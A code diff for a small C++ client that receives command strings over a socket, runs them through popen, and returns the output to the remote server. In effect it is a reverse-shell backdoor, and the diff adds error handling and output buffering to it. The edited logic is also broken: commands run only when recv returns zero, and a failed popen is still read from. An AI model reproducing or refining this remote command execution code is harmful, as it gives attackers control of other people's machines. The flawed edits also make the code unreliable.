@@ -3,6 +3,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <cstdlib>
 
 using namespace std;
 
@@ -18,14 +19,41 @@ int main()
     if(r==0)
     {
         char buffer[4096];
-        recv(server,buffer,4096,0);
-        FILE* p=popen(buffer,"r");
-        char result[4096];
-        while(fgets(buffer,sizeof(buffer),p)!=nullptr)
+        int l=recv(server,buffer,4096,0);
+        if(l==0)
         {
-            send(server,buffer,sizeof(buffer),0);
+        FILE* p=popen(buffer,"r");
+        if(p==nullptr)
+        {
+            cout<<"Nothing to send";
+        }
+        char result[4096];
+        string endresult;
+        while(fgets(result,sizeof(result),p)!=nullptr)
+        {
+            endresult +=result;
+        }
+        int s=send(server,endresult.c_str(),endresult.size(),0);
+        if(s==-1)
+        {
+            cout<<"Sending Error";
+            close(server);
+            exit(1);
         }
         fclose(p);
+        }
+        else if(l==-1)
+        {
+            cout<<"Listening Error";
+            close(server);
+            exit(1);
+        }
+    }
+    else if(r==-1)
+    {
+        cout<<"Connection Error";
+        close(server);
+        exit(1);
     }
     close(server);
 }
